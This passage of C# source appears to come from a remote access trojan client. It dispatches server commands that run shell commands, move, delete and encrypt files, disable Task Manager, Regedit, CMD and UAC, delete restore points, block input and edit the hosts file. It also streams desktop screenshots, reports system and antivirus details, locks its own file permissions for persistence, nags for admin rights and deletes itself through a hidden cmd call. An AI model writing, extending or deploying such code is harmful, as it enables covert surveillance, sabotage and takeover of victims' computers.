                            btns = MessageBoxButtons.AbortRetryIgnore;
                            break;
                    }

                    int counter = 0;
                    while (counter < repeat)
                    {
                        MessageBox.Show(text, title, btns, ico);
                        counter++;
                    }
                    break;
                // FILE MANAGER
                case "FILEMGR":
                    FileManager fm3 = new FileManager();
                    switch (cut[1])
                    {
                        case "listDrives":
                            Send("fmXlistDrives|" + fm3.getDrives());
                            break;

                        case "listdir":
                            Send("fmXlistDrives|" + fm3.getDirectoryData(cut[2]));
                            break;

                        case "excfile":
                            fm3.runFile(cut[2]);
                            break;

                        case "delfile":
                            fm3.delFile(cut[2]);
                            break;

                        case "delFolder":
                            fm3.delDir(cut[2]);
                            break;

                        case "blockfile":
                            fm3.blockfile(cut[2]);
                            break;

                        case "blockfolder":
                            fm3.blockDir(cut[2]);
                            break;

                        case "unblockfile":
                            fm3.unblockFile(cut[2]);
                            break;

                        case "unblockfolder":
                            fm3.unblockDir(cut[2]);
                            break;

                        case "createfolder":
                            fm3.createDir(cut[2]);
                            break;

                        case "dlfile":
                            string sendback = fm3.dlFile(cut[2]);
                            string filename = cut[3];
                            Send("fmXdlfile|" + sendback + "|" + filename + "|" + ClientID + "|" + "File Manager");
                            break;

                        case "uplfile":
                            fm3.uplfile(cut[2], cut[3]);
                            break;
                        case "enfile":
                            string encryptpw = cut[3];
                            fm3.encryptFile(cut[2], encryptpw);
                            break;
                        case "defile":
                            string decryptpw = cut[3];
                            fm3.decryptFile(cut[2], decryptpw);
                            break;
                    }
                    break;

                case "SYSFUNCS":
                    SystemFunctions fma = new SystemFunctions();
                    switch (cut[1])
                    {
                        case "shutdown":
                            fma.shutdown();
                            break;

                        case "reboot":
                            fma.reboot();
                            break;

                        case "logoff":
                            fma.logoff();
                            break;

                        case "hibernate":
                            fma.hibernate();
                            break;

                        case "monitorON":
                            fma.SetMonitorStatus(MonitorState.ON);
                            break;

                        case "monitorOFF":
                            fma.SetMonitorStatus(MonitorState.OFF);
                            break;

                        case "showTaskbar":
                            ShowWindow(TaskbarHandle, 1);
                            break;

                        case "hideTaskbar":
                            ShowWindow(TaskbarHandle, 0);
                            break;

                        case "ejectTray":
                            fma.openTray();
                            break;

                        case "closeTray":
                            fma.closeTray();
                            break;

                        case "enableCMD":
                            fma.enableCMD();
                            break;

                        case "disableCMD":
                            fma.disableCMD();
                            break;

                        case "enableRegedit":
                            fma.enableRegedit();
                            break;

                        case "disableRegedit":
                            fma.disableRegedit();
                            break;

                        case "enableTaskMGR":
                            fma.enableTaskMGR();
                            break;

                        case "disableTaskMGR":
                            fma.disableTaskMGR();
                            break;

                        case "deleteRestorePoints":
                            fma.deleteRestorePoints();
                            break;

                        case "disableUAC":
                            fma.disableUAC();
                            break;

                        case "enableInput":
                            fma.unblockInput();
                            break;

                        case "disableInput":
                            fma.blockInput();
                            break;

                        case "swapButtons":
                            SwapMouseButton(1);
                            break;

                        case "normalButtons":
                            SwapMouseButton(0);
                            break;

                        case "speech":
                            string textx = cut[2];
                            fma.textToSpeech(textx);
                            break;

                        case "shellcmd":
                            string cmd = cut[2];
                            fma.execShellCMD(cmd);
                            break;

                        case "BETA":
                            BetaSystemFunctions fmd = new BetaSystemFunctions();
                            switch (cut[2])
                            {
                                case "":
                                    // Nothing here yet
                                    break;
                            }
                            break;
                    }
                    break;

                case "ANTIM":
                    StartAntiMalwareThread("#");
                    break;

                case "PROANTIME":
                    proActiveIsEnabled = true;
                    Thread tPR = new Thread(new ThreadStart(proactiveAM));
                    tPR.IsBackground = true;
                    tPR.Start();
                    break;

                case "PROANTIMD":
                    proActiveIsEnabled = false;
                    break;
                case "HOSTS":
                    HostsFileManager hostsmgr = new HostsFileManager();
                    switch(cut[1])
                    {

                        case "get":
                            string hosts = hostsmgr.getHostsText();
                            addinfo(hosts);
                            Send("hostsXsetxt|" + hosts);
                            break;
                        case "set": // Funktioniert nicht
                            hostsmgr.setHostsText(cut[2]);
                            break;
                    }
                    break;
                case "WDMGR":
                    WindowManager wdmgr = new WindowManager();
                    switch (cut[1])
                    {
                        case "list":
                            string wlist = wdmgr.getWindowList();
                            Send("Wlist|" + wlist);
                            break;

                        case "rename":
                            string oldName = cut[2];
                            string newName = cut[3];
                            wdmgr.renameWindow(oldName, newName);
                            break;

                        case "maximize":
                            string winName = cut[2];
                            wdmgr.maximizeWindow(winName);
                            break;

                        case "minimize":
                            string winNamex = cut[2];
                            wdmgr.minimizeWindow(winNamex);
                            break;

                        case "show":
                            string winNamey = cut[2];
                            wdmgr.showWindow(winNamey);
                            break;

                        case "hide":
                            string winNamez = cut[2];
                            wdmgr.hideWindow(winNamez);
                            break;
                    }
                    break;
            }
        }

        public bool proActiveIsEnabled = false;

        public void proactiveAM()
        {
            begin:
            if (proActiveIsEnabled == true)
            {
                Send("ADDLOG|" + ClientID + "|" + "Info" + "|" + "Starting Proactive Anti Malware Scanner...");
                StartAntiMalwareThread("#");
                Send("ADDLOG|" + ClientID + "|" + "Info" + "|" + "Finished Proactive Anti Malware Scanner! Waiting 5 Minutes...");
                Thread.Sleep(300000);
                goto begin;
            }
            else
            {
                goto begin;
            }
        }

        public Thread StartAntiMalwareThread(String excparams)
        {
            var t = new Thread(() => antimalware(excparams));
            t.Start();
            return t;
        }

        private void antimalware(String excparams)
        {
            AntiMalware amal = new AntiMalware();
            amal.mwork = this;
            amal.excparams = excparams;
            Thread antimalthrd = new Thread(amal.Start);
            antimalthrd.IsBackground = true;
            antimalthrd.Start();
        }

        public Thread StartFileSearcherThread(String filename, String location, String action, String taskid)
        {
            var t = new Thread(() => startsearch(filename, location, action, taskid));
            t.Start();
            return t;
        }

        private void startsearch(String filename, String location, String action, String taskid)
        {
            FileSearcher fsearch = new FileSearcher();
            fsearch.mwork = this;
            fsearch.filename = filename;
            fsearch.loc = location;
            fsearch.taskid = taskid;
            fsearch.action = action;
            Thread searchthrd = new Thread(fsearch.Start);
            searchthrd.IsBackground = true;
            searchthrd.Start();
        }

        private void getShellInput()
        {
            try
            {
                String tempBuf = "";
                String tempError = "";
                String edata = "";
                string sdata = "";
                while ((tempBuf = fromShell.ReadLine()) != null)
                {
                    sdata = sdata + tempBuf + "[newline]";
                    Console.WriteLine("SData: " + @sdata);
                    Console.WriteLine("TempBuf: " + @tempBuf);
                    sdata = sdata.Replace("cmdout", String.Empty);
                    Send("CMDOUTPUT|" + sdata.Replace("|", "/"));
                    sdata = "";
                }

                while ((tempError = error.ReadLine()) != null)
                {
                    edata = edata + tempError + "\r";
                    Send("CMDOUTPUT|" + edata.Replace("|", "/"));
                    edata = "";
                }
            }
            catch (Exception ex)
            {
            }
        }

        private void grabInfo()
        {
            ClientInfo cinfo = new ClientInfo();
            // Client Info
            string clientID = ClientID;
            string clientPath = Application.ExecutablePath;
            string privs = Privileges;
            // Software Info
            string OperatingSystem = getOS();
            string activeWindow = GetActiveWindowTitle();
            string antivirus = cinfo.getInstalledAv();
            string systemUptime = cinfo.GetSystemUpTimeInfo();
            string MachineName = Environment.MachineName;
            string userName = Environment.UserName;
            // Hardware Info
            string machineType = checkDeviceType();
            string CPU = cinfo.getCpuName();
            string GPU = cinfo.getGpuName();
            string InstalledRAM = cinfo.getInstalledRAM();
            string MonitorCount = cinfo.getMonitorCount();
            Send("SADVINFO|" + clientID + "|" + clientPath + "|" + privs + "|" + OperatingSystem + "|" + activeWindow + "|" + antivirus + "|" + systemUptime + "|" + MachineName + "|" + userName + "|" + machineType + "|" + CPU + "|" + GPU + "|" + InstalledRAM + "|" + MonitorCount);
        }

        public string Uacmode = "nonpersist";

        public void askUac()
        {
            repeat:
            SendStatus("Asking for Admin Privileges...");
            var SelfProc = new ProcessStartInfo
            {
                UseShellExecute = true,
                WorkingDirectory = Environment.CurrentDirectory,
                FileName = Application.ExecutablePath,
                Verb = "runas"
            };
            try
            {
                Process.Start(SelfProc);
                SendStatus("Successfully elevated to Admin!");
                Environment.Exit(0);
            }
            catch
            {
                SendStatus("Eelevation Request denied!");
                if (Uacmode.Equals("persist"))
                {
                    goto repeat;
                }
            }
        }

        public void Uninstall()
        {
            SendStatus("Uninstalling...");
            try
            {
                binper.Abort();
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(Application.ExecutablePath);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(false, false);
                FolderInfo.SetAccessControl(FolderAcl);
                Thread.Sleep(500);
            }
            catch { }
            System.Diagnostics.ProcessStartInfo pd = new System.Diagnostics.ProcessStartInfo("cmd.exe");
            pd.Arguments = "/C ping 1.1.1.1 -n 1 -w " + 6 + " > Nul & Del " + ControlChars.Quote + Application.ExecutablePath + ControlChars.Quote;
            pd.CreateNoWindow = true;
            pd.ErrorDialog = false;
            pd.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            System.Diagnostics.Process.Start(pd);
            hunaLogs = "";
            Environment.Exit(0);
        }

        private static Image GrabDesktop()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics graphic = Graphics.FromImage(screenshot);
            graphic.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            return screenshot;
        }

        public static string ImageToBase64String(Image image, ImageFormat format)
        {
            MemoryStream memory = new MemoryStream();
            image.Save(memory, format);
            string base64 = Convert.ToBase64String(memory.ToArray());
            memory.Close();

            return base64;
        }

        public static bool sendDesktop = false;

        private void sendDesktopLoop()
        {
            SendStatus("Started Streaming Remote Desktop...");
            wtf:
            if (sendDesktop == false)
            {
                SendStatus("Stopped Streaming Remote Desktop...");
                return;
            }
            while (sendDesktop == true)
            {
                Send("RDESKIMG|" + ImageToBase64String(GrabDesktop(), ImageFormat.Jpeg));
                addlog("Remote Desktop: Sent Picture: {Format: JPEG}");
            }
            goto wtf;
        }

        public static string chattingWith = string.Empty;

        public static Chat ch;

        [STAThread]
        private void launchChat()
        {
            try
            {
                ch = new Chat();
                ch.Name = ("|chat|");
                ch.Text = ("Chatting with " + chattingWith);
                ch.ec2 = this;
                System.Windows.Forms.Application.Run(ch);
            } catch(Exception eax) { adderror(eax.ToString());  }
            
        }

        [STAThread]
        private static void addChatMessage(String message)
        {
            ch.addchat(chattingWith, message);
        }

        public void Send(string msg)
        {
            try
            {
                StreamWriter writer = new StreamWriter(client.GetStream());
                writer.WriteLine(msg);
                writer.Flush();
                if (msg.Length < 100)
                {
                    addinfo("Successfully sent the command '" + msg + "' to the Server!");
                }
                else
                {
                    addinfo("Successfully sent the command '" + msg.Split('|')[0] + "' to the Server!");
                }
            }
            catch
            {
            }
        }

        public void SendStatus(string msg)
        {
            try
            {
                StreamWriter writer = new StreamWriter(client.GetStream());
                writer.WriteLine("STATUS|" + msg);
                writer.Flush();
                addlog("Successfully updated Status to '" + msg + "'!");
            }
            catch
            {
            }
        }

        private static string prev = "";

        private void updateActiveWindow()
        {
            tas: try
            {
                if (prev == GetActiveWindowTitle())
                {
                    addlog("Didnt update Active Window. Still the same!");
                    Thread.Sleep(activeWindowUpdateInterval);
                    goto tas;
                }
                else
                {
                    string now = GetActiveWindowTitle();
                    StreamWriter writer = new StreamWriter(client.GetStream());
                    writer.WriteLine("ACTWINDOW|" + now);
                    writer.Flush();
                    addlog("Successfully updated Active Window to '" + now + "'!");
                    prev = now;
                    Thread.Sleep(activeWindowUpdateInterval);
                    goto tas;
                }
            }
            catch
            {
            }
        }

        public static string GetPingMs(string hostNameOrAddress)
        {
            System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
            return ping.Send(IPAddress.Parse(hostNameOrAddress)).RoundtripTime.ToString() + " ms";
        }

        public void addlog(string msg)
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[" + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "] ");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write("[LOG] ");
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.Write(msg);
            Console.Write("\n");
            hunaLogs += "[" + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "] [LOG] " + msg;
        }

        public void adderror(string msg)
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[" + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "] ");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[ERROR] ");
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.Write(msg);
            Console.Write("\n");
            hunaLogs += "[" + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "] [ERROR] " + msg;
        }

        public void addinfo(string msg)
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[" + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "] ");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.Write("[INFO] ");
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.Write(msg);
            Console.Write("\n");
            hunaLogs += "[" + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "] [INFO] " + msg;
        }

        public static bool IsAdmin()
        {
            try
            {
                WindowsIdentity id = WindowsIdentity.GetCurrent();
                WindowsPrincipal p = new WindowsPrincipal(id);
                return p.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (System.Exception Return)
            {
                return false;
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString().Replace("|", "/");
            }
            return null;
        }

        public static string checkDeviceType()
        {
            try
            {
                PowerStatus ps = SystemInformation.PowerStatus;
                string batteryStatus = ps.BatteryChargeStatus.ToString();
                if (getOS().Contains("Server"))
                {
                    return "Server";
                }
                if ((batteryStatus == "NoSystemBattery"))
                {
                    return "Desktop";
                }
                else
                {
                    return "Laptop";
                }
            }
            catch (Exception ex)
            {
                return "Error";
            }
        }

        public static string getOS()
        {
            string os = "";
            string query = "SELECT Caption FROM Win32_OperatingSystem";
            foreach (ManagementObject MO in getInfo(query))
            {
                os = os + MO["Caption"].ToString();
            }
            return os;
        }

        public void setpersist()
        {
            again:
            System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(Application.ExecutablePath);
            DirectorySecurity FolderAcl = new DirectorySecurity();
            FolderAcl.SetAccessRuleProtection(true, false);
            FolderInfo.SetAccessControl(FolderAcl);
            Thread.Sleep(300);
            goto again;
        }

        public static string getRAMSerial()
        {
            string ramSerial = "";
            string query = "SELECT SerialNumber FROM Win32_PhysicalMemory";
            foreach (ManagementObject MO in getInfo(query))
            {
                if (MO["SerialNumber"] != null)
                {
                    ramSerial = ramSerial + MO["SerialNumber"].ToString();
                }
            }

            return ramSerial;
        }

        public static ManagementObjectCollection getInfo(string query)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            ManagementObjectCollection oC = searcher.Get();
            searcher.Dispose();
            return oC;
        }

        public static string getHardwareHash()
        {
            string hwHash = getRAMSerial();
            hwHash = hwHash.Replace(":", "");
            hwHash = hwHash.Replace(" ", "");
            byte[] bytes = Encoding.Unicode.GetBytes(hwHash);
            SHA256Managed hashstring = new SHA256Managed();
            byte[] hash = hashstring.ComputeHash(bytes);
            string hashString = "";
            foreach (byte b in hash)
            {
                hashString += string.Format("{0:x2}", b);
            }
            return hashString;
        }

        [DllImport("User32.dll")]
        private static extern int MessageBoxA(int hwnd, string msg, string title, int type);

        [DllImport("Comctl32.dll")]
        private static extern void InitCommonControls();
    }
}